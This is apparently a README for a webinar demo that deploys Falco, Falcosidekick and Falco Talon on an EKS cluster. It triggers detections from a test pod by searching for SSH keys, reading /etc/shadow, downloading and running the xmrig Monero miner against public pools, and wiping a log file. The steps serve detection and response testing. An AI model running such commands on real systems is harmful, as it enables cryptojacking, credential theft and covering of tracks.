# Falcosidekick-Talon-CNCF
CNCF webinar to discuss Falcosidekick and how it integrates with Falco Talon as an output channel.

Set up an ```AWS-CLI Profile``` in order to interact with AWS services via my local workstation
```
aws configure --profile nigel-aws-profile
export AWS_PROFILE=nigel-aws-profile                                            
aws sts get-caller-identity --profile nigel-aws-profile
aws eks update-kubeconfig --region eu-west-1 --name falco-cluster
```

## Create EKS Cluster with Cilium CNI

```
eksctl create cluster --name falco-cluster --without-nodegroup
```

Once ```aws-node``` DaemonSet is deleted, EKS will not try to restore it.
```
kubectl -n kube-system delete daemonset aws-node
```

Setup Helm repository:
```
helm repo add cilium https://helm.cilium.io/
```

Deploy Cilium release via Helm:
```
helm install cilium cilium/cilium --version 1.9.18 \
  --namespace kube-system \
  --set eni=true \
  --set ipam.mode=eni \
  --set egressMasqueradeInterfaces=eth0 \
  --set tunnel=disabled \
  --set nodeinit.enabled=true
```

Create a node group since there are no worker nodes for our pods
```
eksctl create nodegroup --cluster falco-cluster --node-type t3.xlarge --nodes 1 --nodes-min=0 --nodes-max=3 --max-pods-per-node 58
```

```
mkdir falco-response
```

```
cd falco-response
```

Download the ```custom-rules.yaml``` file. <br/>
This enables the originally disabled ```Detect outbound connections to common miner pool ports``` Falco Rule. <br/>
However, I see to be breaking the deployment with the below ```custom-rules.yaml``` file, so I'm leaving it out for now.
```
wget https://raw.githubusercontent.com/nigel-falco/Falcosidekick-Talon-CNCF/main/custom-rules.yaml
```

## Install Falco and Falcosidekick

Docs Page: https://docs.falco-talon.org/docs/installation_usage/falcosidekick/

```
helm install falco falcosecurity/falco --namespace falco \
  --create-namespace \
  --set tty=true \
  --set falcosidekick.enabled=true \
  --set falcosidekick.webui.enabled=true \
  --set falcosidekick.webui.redis.storageEnabled=false \
  --set falcosidekick.config.webhook.address=http://falco-talon:2803 \
  --set "falcoctl.config.artifact.install.refs={falco-rules:2,falco-incubating-rules:2,falco-sandbox-rules:2}" \
  --set "falcoctl.config.artifact.follow.refs={falco-rules:2,falco-incubating-rules:2,falco-sandbox-rules:2}" \
  --set "falco.rules_file={/etc/falco/falco_rules.yaml,/etc/falco/falco-incubating_rules.yaml,/etc/falco/falco-sandbox_rules.yaml,/etc/falco/rules.d}" \
  -f custom-rules.yaml
```

## Falco detections before Falcosidekick UI
Shell into a Kubernetes workload:
```
kubectl exec -it dodgy-pod -- bash
```
To do so, let's simulate someone trying to sniff for SSH keys. <br/>
Run find on the root home dir, querying for "```id_rsa```":
```
find /root -name "id_rsa"
```
```Rule:``` https://thomas.labarussias.fr/falco-rules-explorer/?hash=55941ff25a7d8c6253b5a17e4ed20d30
Print to stdout the logs with:
```
kubectl logs -f --tail=0 -n falco -c falco -l app.kubernetes.io/name=falco | grep 'Warning Grep private keys'
```

An attempt to read any sensitive file (e.g. files containing user/password/authentication information). <br/>
In modern containerized cloud infrastructures, accessing traditional Linux sensitive files might be less relevant, yet it remains valuable for baseline detections. <br/>
While we provide additional rules for SSH or cloud vendor-specific credentials, you can significantly enhance your security program by crafting custom rules for critical application credentials unique to your environment.

```Rule:``` https://thomas.labarussias.fr/falco-rules-explorer/?hash=5116b3ca0c5fad246cc41ca67938a315
```
sudo cat /etc/shadow > /dev/null
```

```
kubectl logs -f --tail=0 -n falco -c falco -l app.kubernetes.io/name=falco | grep 'Read sensitive file untrusted'
```

## Install Falco Talon to React to Falcosidekick Outputs

```
git clone https://github.com/Issif/falco-talon.git
```

The Talon rules file ```rules.yaml``` is located in the ```helm``` directory:
```
cd falco-talon/deployment/helm/
```

Before installing, let's enforce the custom response actions for OWASP T10 framework.

```
rm rules.yaml
```

```
wget https://raw.githubusercontent.com/nigel-falco/falco-talon-testing/main/falco-talon/rules.yaml
```

Deploy Talon into the newly created ```falco``` network namespace:
```
helm install falco-talon . -n falco
```

## Create an insecure workload

```
kubectl apply -f https://raw.githubusercontent.com/nigel-falco/falco-talon-testing/main/dodgy-pod.yaml
```
In the second window, run:
```
kubectl get events -n default
```
Back in the first window, run: <br/>
```Rule:``` https://thomas.labarussias.fr/falco-rules-explorer/?hash=1a24c2ccf3a790d0c04e3858f7439ab4
```
kubectl exec -it dodgy-pod -- bash
```
Download the miner from Github
```
curl -OL https://github.com/xmrig/xmrig/releases/download/v6.16.4/xmrig-6.16.4-linux-static-x64.tar.gz
```
Unzip xmrig package:
```
tar -xvf xmrig-6.16.4-linux-static-x64.tar.gz
```
```
cd xmrig-6.16.4
```
```Rule:``` https://thomas.labarussias.fr/falco-rules-explorer/?hash=b22719ac071b8de3c7e0ec92dcab21cb
```
./xmrig -o stratum+tcp://xmr.pool.minergate.com:45700 -u lies@lies.lies -p x -t 2
```
```Rule:``` https://thomas.labarussias.fr/falco-rules-explorer/?hash=3f01c102c6d26af968d5eb6b6777085d
```
./xmrig --donate-level 8 -o xmr-us-east1.nanopool.org:14433 -u 422skia35WvF9mVq9Z9oCMRtoEunYQ5kHPvRqpH1rGCv1BzD5dUY4cD8wiCMp4KQEYLAN1BuawbUEJE99SNrTv9N9gf2TWC --tls --coin monero --background
```


## Testing the Script response action

Copy file from a container and trigger a ```Kubernetes Client Tool Launched in Container``` detection in Falco: <br/>
```Rule:``` https://thomas.labarussias.fr/falco-rules-explorer/?hash=bc5091ab0698e22b68d788e490e8eb66

```
kubectl cp dodgy-pod:xmrig-6.16.4-linux-static-x64.tar.gz ~/desktop/xmrig-6.16.4-linux-static-x64.tar.gz
```


## Enforce Network Policy on Suspicious Traffic

```
kubectl exec -it dodgy-pod -- bash
```

```Rule:``` https://thomas.labarussias.fr/falco-rules-explorer/?hash=0d2e8a0dd3369a030f7acfaab682ad92
```
curl 52.21.188.179
```

Check to confirm the IP address was blocked:
```
kubectl get networkpolicy dodgy-pod -o yaml
```

```
kubectl delete networkpolicy dodgy-pod
```

## Pod Run as Root User

```Rule:``` https://thomas.labarussias.fr/falco-rules-explorer/?hash=353fe5313eb9fe14878f7eaae04550a3
```
kubectl run nigelroot --image=alpine --restart=Never --rm -it -- /bin/sh -c 'echo "Tampering with log file" > /var/log/access.log; cat /dev/null > /var/log/access.log'
```


## Expose the Falcosidekick UI
```
kubectl port-forward svc/falco-falcosidekick-ui -n falco 2802 --insecure-skip-tls-verify
```

Talon can be removed at any time via:
```
helm uninstall falco-talon -n falco
```

Scale down the cluster
```
eksctl get nodegroups --cluster falco-cluster
```
```
eksctl scale nodegroup --cluster falco-cluster --name ng-58324369 --nodes 0
```

Kubecolor
```
alias kubectl="kubecolor"
```

Upgrade of Falco and Falcosidekick
```
helm upgrade falco falcosecurity/falco --namespace falco \
  --create-namespace \
  --set tty=true \
  --set falcosidekick.enabled=true \
  --set falcosidekick.webui.enabled=true \
  --set falcosidekick.webui.redis.storageEnabled=false \
  --set falcosidekick.config.webhook.address=http://falco-talon:2803 \
  --set "falcoctl.config.artifact.install.refs={falco-rules:2,falco-incubating-rules:2,falco-sandbox-rules:2}" \
  --set "falcoctl.config.artifact.follow.refs={falco-rules:2,falco-incubating-rules:2,falco-sandbox-rules:2}" \
  --set "falco.rules_file={/etc/falco/falco_rules.yaml,/etc/falco/falco-incubating_rules.yaml,/etc/falco/falco-sandbox_rules.yaml,/etc/falco/rules.d}" \
  -f custom-rules.yaml
```
